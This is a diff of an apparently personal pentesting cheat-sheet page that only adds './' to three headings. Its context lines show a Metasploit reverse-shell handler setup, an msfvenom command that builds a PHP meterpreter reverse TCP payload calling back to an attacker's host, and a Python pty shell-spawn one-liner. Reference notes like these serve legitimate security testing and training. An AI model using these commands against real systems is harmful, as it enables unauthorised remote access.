@@ -5,7 +5,7 @@ permalink: /snippets
 ---
 
 ## Metasploit
-#### Handlers
+#### ./ Handlers
 ```bash 
 msf6 > use exploit/multi/handler
 msf6 > set PAYLOAD <Payload name>
@@ -19,7 +19,7 @@ Once the required values are completed the following command will execute your h
 <br/>
 <br/>
 
-#### Scripting Payloads
+#### ./ Scripting Payloads
 ###### PHP
 ```bash
 msfvenom -p php/meterpreter_reverse_tcp lhost=<your-IP-address> lport=<your-port-address> -o shell.php
@@ -28,7 +28,7 @@ msfvenom -p php/meterpreter_reverse_tcp lhost=<your-IP-address> lport=<your-port
 <br/>
 
 ## Python
-#### Spawn a terminal
+#### ./ Spawn a terminal
 
 ```python
 python -c 'import pty;pty.spawn("/bin/bash")';
